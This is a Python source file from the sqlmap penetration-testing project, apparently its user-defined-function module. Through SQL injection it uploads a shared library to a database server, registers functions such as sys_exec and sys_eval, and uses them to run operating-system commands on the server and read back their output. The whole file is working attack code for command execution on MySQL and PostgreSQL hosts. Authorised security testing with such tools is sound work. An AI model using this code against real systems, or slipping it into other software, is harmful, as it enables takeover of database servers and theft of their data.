#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import os

from lib.core.agent import agent
from lib.core.common import readInput
from lib.core.convert import urlencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.dump import dumper
from lib.core.exception import sqlmapFilePathException
from lib.core.exception import sqlmapMissingMandatoryOptionException
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.request import inject
from lib.techniques.outband.stacked import stackedTest


class UDF:
    """
    This class defines methods to deal with User-Defined Functions for
    plugins.
    """

    def __init__(self):
        self.createdUdf  = set()
        self.udfs        = {}
        self.udfToCreate = set()


    def __askOverwriteUdf(self, udf):
        message  = "UDF '%s' already exists, do you " % udf
        message += "want to overwrite it? [y/N] "
        output   = readInput(message, default="N")

        if output and output[0] in ("y", "Y"):
            return True
        else:
            return False


    def __checkExistUdf(self, udf):
        logger.info("checking if UDF '%s' already exist" % udf)

        query  = agent.forgeCaseStatement(queries[kb.dbms].checkUdf % (udf, udf))
        exists = inject.getValue(query, resumeValue=False, unpack=False)

        if exists == "1":
            return True
        else:
            return False
        

    def udfCheckAndOverwrite(self, udf):
        exists    = self.__checkExistUdf(udf)
        overwrite = True

        if exists is True:
            overwrite = self.__askOverwriteUdf(udf)

        if overwrite is True:
            self.udfToCreate.add(udf)


    def udfCreateSupportTbl(self, dataType):
        debugMsg  = "creating a support table to write commands standard "
        debugMsg += "output to"
        logger.debug(debugMsg)

        self.createSupportTbl(self.cmdTblName, self.tblField, dataType)


    def udfExecCmd(self, cmd, silent=False, udfName=None):
        cmd = urlencode(cmd, convall=True)

        if udfName is None:
            cmd     = "'%s'" % cmd
            udfName = "sys_exec"

        inject.goStacked("SELECT %s(%s)" % (udfName, cmd), silent)


    def udfEvalCmd(self, cmd, first=None, last=None, udfName=None):
        cmd = urlencode(cmd, convall=True)

        if udfName is None:
            cmd     = "'%s'" % cmd
            udfName = "sys_eval"

        inject.goStacked("INSERT INTO %s(%s) VALUES (%s(%s))" % (self.cmdTblName, self.tblField, udfName, cmd))
        output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, firstChar=first, lastChar=last)
        inject.goStacked("DELETE FROM %s" % self.cmdTblName)

        if isinstance(output, (list, tuple)):
            output = output[0]

            if isinstance(output, (list, tuple)):
                output = output[0]

        return output


    def udfCreateFromSharedLib(self):
        errMsg = "udfSetRemotePath() method must be defined within the plugin"
        raise sqlmapUnsupportedFeatureException, errMsg


    def udfSetRemotePath(self):
        errMsg = "udfSetRemotePath() method must be defined within the plugin"
        raise sqlmapUnsupportedFeatureException, errMsg


    def udfInjectCmd(self):
        errMsg = "udfInjectCmd() method must be defined within the plugin"
        raise sqlmapUnsupportedFeatureException, errMsg


    def udfInjectCore(self, udfDict):
        for udf in udfDict.keys():
            if udf in self.createdUdf:
                continue

            self.udfCheckAndOverwrite(udf)

        if len(self.udfToCreate) > 0:
            self.udfSetRemotePath()
            self.writeFile(self.udfLocalFile, self.udfRemoteFile, "binary", False)

        for udf, inpRet in udfDict.items():
            if udf in self.udfToCreate and udf not in self.createdUdf:
                self.udfCreateFromSharedLib(udf, inpRet)

        if kb.dbms == "MySQL":
            supportTblType = "longtext"
        elif kb.dbms == "PostgreSQL":
            supportTblType = "text"

        self.udfCreateSupportTbl(supportTblType)


    def udfInjectCustom(self):
        if kb.dbms not in ( "MySQL", "PostgreSQL" ):
            errMsg = "UDF injection feature is not yet implemented on %s" % kb.dbms
            raise sqlmapUnsupportedFeatureException, errMsg

        stackedTest()

        if kb.stackedTest == False:
            return

        self.checkDbmsOs()

        if self.isDba() == False:
            warnMsg  = "the functionality requested might not work because "
            warnMsg += "the session user is not a database administrator"
            logger.warn(warnMsg)

        if not conf.shLib:
            msg = "which is the local path of the shared library? "

            while True:
                self.udfLocalFile = readInput(msg)

                if self.udfLocalFile:
                    break
                else:
                    logger.warn("you need to specify the local path of the shared library")
        else:
            self.udfLocalFile = conf.shLib

        if not os.path.exists(self.udfLocalFile):
            errMsg = "the specified shared library file does not exist"
            raise sqlmapFilePathException, errMsg

        if not self.udfLocalFile.endswith(".dll") and not self.udfLocalFile.endswith(".so"):
            errMsg = "shared library file must end with '.dll' or '.so'"
            raise sqlmapMissingMandatoryOptionException, errMsg

        elif self.udfLocalFile.endswith(".so") and kb.os == "Windows":
            errMsg  = "you provided a shared object as shared library, but "
            errMsg += "the database underlying operating system is Windows"
            raise sqlmapMissingMandatoryOptionException, errMsg

        elif self.udfLocalFile.endswith(".dll") and kb.os == "Linux":
            errMsg  = "you provided a dynamic-link library as shared library, "
            errMsg += "but the database underlying operating system is Linux"
            raise sqlmapMissingMandatoryOptionException, errMsg

        self.udfSharedLibName = os.path.basename(self.udfLocalFile).split(".")[0]
        self.udfSharedLibExt  = os.path.basename(self.udfLocalFile).split(".")[1]

        msg  = "how many user-defined functions do you want to create "
        msg += "from the shared library? "

        while True:
            udfCount = readInput(msg, default=1)

            if isinstance(udfCount, str) and udfCount.isdigit():
                udfCount = int(udfCount)

                if udfCount <= 0:
                    logger.info("nothing to inject then")
                    return
                else:
                    break

            elif isinstance(udfCount, int):
                break

            else:
                logger.warn("invalid value, only digits are allowed")

        for x in range(0, udfCount):
            while True:
                msg     = "what is the name of the UDF number %d? " % (x + 1)
                udfName = readInput(msg)

                if udfName:
                    self.udfs[udfName] = {}
                    break
                else:
                    logger.warn("you need to specify the name of the UDF")

            if kb.dbms == "MySQL":
                defaultType = "string"
            elif kb.dbms == "PostgreSQL":
                defaultType = "text"

            self.udfs[udfName]["input"] = []

            default = 1
            msg     = "how many input parameters takes UDF "
            msg    += "'%s'? (default: %d) " % (udfName, default)

            while True:
                parCount = readInput(msg, default=default)

                if isinstance(parCount, str) and parCount.isdigit() and int(parCount) >= 0:
                    parCount = int(parCount)
                    break

                elif isinstance(parCount, int):
                    break

                else:
                    logger.warn("invalid value, only digits >= 0 are allowed")

            for y in range(0, parCount):
                msg     = "what is the data-type of input parameter "
                msg    += "number %d? (default: %s) " % ((y + 1), defaultType)

                while True:
                    parType = readInput(msg, default=defaultType)

                    if isinstance(parType, str) and parType.isdigit():
                        logger.warn("you need to specify the data-type of the parameter")

                    else:
                        self.udfs[udfName]["input"].append(parType)
                        break

            msg  = "what is the data-type of the return "
            msg += "value? (default: %s) " % defaultType

            while True:
                retType = readInput(msg, default=defaultType)

                if isinstance(retType, str) and retType.isdigit():
                    logger.warn("you need to specify the data-type of the return value")

                else:
                    self.udfs[udfName]["return"] = retType
                    break

        self.udfInjectCore(self.udfs)

        msg    = "do you want to call your injected user-defined "
        msg   += "functions now? [Y/n/q] "
        choice = readInput(msg, default="Y")

        if choice[0] not in ( "y", "Y" ):
            self.cleanup(udfDict=self.udfs)
            return

        while True:
            udfList = []
            msg     = "which UDF do you want to call?"

            for udf, inpRet in self.udfs.items():
                udfList.append(udf)
                msg += "\n[%d] %s" % (len(udfList), udf)

            msg += "\n[q] Quit"

            while True:
                choice = readInput(msg)

                if choice[0] in ( "q", "Q" ):
                    break

                if isinstance(choice, str) and choice.isdigit() and int(choice) > 0 and int(choice) <= len(udfList):
                    choice = int(choice)
                    break

                elif isinstance(choice, int) and choice > 0 and choice <= len(udfList):
                    break

                else:
                    warnMsg  = "invalid value, only digits >= 1 and "
                    warnMsg += "<= %d are allowed" % len(udfList)
                    logger.warn(warnMsg)

            cmd       = ""
            count     = 1
            udfToCall = udfList[choice - 1]

            for inp in self.udfs[udfToCall]["input"]:
                msg  = "what is the value of the parameter number "
                msg += "%d (data-type: %s)? " % (count, inp)

                while True:
                    parValue = readInput(msg)

                    if parValue:
                        if "int" not in inp and "bool" not in inp:
                            parValue = "'%s'" % parValue

                        cmd += "%s," % parValue

                        break
                    else:
                        logger.warn("you need to specify the value of the parameter")

                count += 1

            cmd    = cmd[:-1]
            msg    = "do you want to retrieve the return value of the "
            msg   += "UDF? [Y/n] "
            choice = readInput(msg, default="Y")

            if choice[0] in ("y", "Y"):
                output = self.udfEvalCmd(cmd, udfName=udfToCall)

                if output:
                    dumper.string("return value", output)
                else:
                    print "No return value"
            else:
                self.udfExecCmd(cmd, udfName=udfToCall, silent=True)

            msg    = "do you want to call this or another injected UDF? [Y/n] "
            choice = readInput(msg, default="Y")

            if choice[0] not in ("y", "Y"):
                break

        self.cleanup(udfDict=self.udfs)
